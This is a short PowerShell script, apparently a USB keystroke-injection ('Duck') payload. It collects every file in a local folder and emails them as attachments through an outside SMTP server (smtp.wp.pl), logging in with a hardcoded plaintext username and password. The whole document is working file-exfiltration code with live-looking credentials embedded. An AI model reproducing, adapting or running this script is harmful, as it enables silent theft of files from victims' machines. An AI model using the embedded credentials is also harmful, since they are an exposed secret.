$SMTPServer = 'smtp.wp.pl'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 465)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('emaildotestowania1@wp.pl', 'Lukasz123');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'emaildotestowania1@wp.pl'
$ReportEmail.To.Add('emaildotestowania1@wp.pl')
$ReportEmail.Subject = 'Duck Report'
$ReportEmail.Body = 'Attached is your duck report.... Quack' 
$files=Get-ChildItem "C:\l\"
Foreach($file in $files)
{

$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
$ReportEmail.Attachments.Add($attachment)
$SMTPInfo.Send($ReportEmail)
}
write-host "Mail Sent Successfully"